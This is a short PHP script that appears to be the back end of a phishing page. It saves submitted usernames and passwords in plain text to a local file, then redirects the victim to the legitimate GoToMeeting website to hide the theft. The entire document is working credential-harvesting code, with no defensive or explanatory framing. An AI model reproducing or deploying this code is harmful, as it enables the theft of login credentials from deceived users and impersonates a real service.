<?php
if(isset($_POST['submit'])){
	$uname="Username: ".$_POST['uname']."";
	$passw="Password: ".$_POST['pass']."";
	$file=fopen("CAG.txt", "a");
	fwrite($file, $uname);
	fwrite($file, "\n");
	fwrite($file, $passw);
	fwrite($file, "\n");
	fclose($file);
	header("Location:https://www.gotomeeting.com/en-in");
}
?>